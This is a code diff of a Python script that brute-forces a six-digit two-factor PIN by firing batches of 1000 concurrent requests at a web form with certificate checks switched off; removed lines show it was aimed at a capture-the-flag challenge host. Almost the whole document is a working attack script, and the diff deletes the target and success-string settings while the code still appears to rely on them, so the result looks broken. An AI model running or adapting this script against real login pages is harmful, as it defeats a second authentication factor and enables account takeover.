@@ -1,27 +1,20 @@
-import itertools
 import aiohttp
 import asyncio
+import itertools
 import ssl
 
-# Configuration
-TARGET_URL = "https://blackrock-d6aeb6b1d709-2fa-1.chals.io/2fa"  # Replace with actual URL
-SUCCESS_INDICATOR = "flag"  # Replace with the string that indicates a successful login
-
-# Disable SSL certificate verification
 sslcontext = ssl.create_default_context()
 sslcontext.check_hostname = False
 sslcontext.verify_mode = ssl.CERT_NONE
 
 async def attempt_login(session, pincode):
-    """Attempt to submit the pincode to the 2FA form asynchronously."""
-    # Split the pincode into individual digits (padding if necessary)
     data = {
         'pincode.1': pincode[0],
         'pincode.2': pincode[1],
         'pincode.3': pincode[2],
         'pincode.4': pincode[3],
-        'pincode.5': pincode[4] if len(pincode) > 4 else '0',
-        'pincode.6': pincode[5] if len(pincode) > 5 else '0'
+        'pincode.5': pincode[4],
+        'pincode.6': pincode[5]
     }
 
     try:
@@ -35,34 +28,23 @@ async def attempt_login(session, pincode):
 
     return False
 
-async def try_pincodes(pincodes):
-    """Submit a batch of pincodes to the 2FA form."""
+async def main():
+    digits = '0123456789'
+    pincodes = (''.join(pincode) for pincode in itertools.product(digits, repeat=6))
+
     async with aiohttp.ClientSession() as session:
         tasks = []
         for pincode in pincodes:
             tasks.append(attempt_login(session, pincode))
 
-            if len(tasks) >= 1000:  # Batch requests in groups of 1000
+            if len(tasks) >= 1000:  
                 results = await asyncio.gather(*tasks)
                 if any(results):
                     break
-                tasks = []  # Reset for the next batch
+                tasks = []
 
-        # Run any remaining tasks (less than 1000)
         if tasks:
             await asyncio.gather(*tasks)
 
-async def main():
-    # Step 1: Try all 4-digit codes from 6800 to 9999
-    print("Trying 4-digit codes (6800-9999)...")
-    four_digit_pincodes = (f"{pincode:04d}" for pincode in range(6800, 10000))
-    await try_pincodes(four_digit_pincodes)
-
-    # Step 2: If unsuccessful, try all 6-digit codes
-    print("Trying all 6-digit codes...")
-    digits = '0123456789'
-    six_digit_pincodes = (''.join(pincode) for pincode in itertools.product(digits, repeat=6))
-    await try_pincodes(six_digit_pincodes)
-
-# Run the main coroutine in Jupyter Notebook
 await main()
+
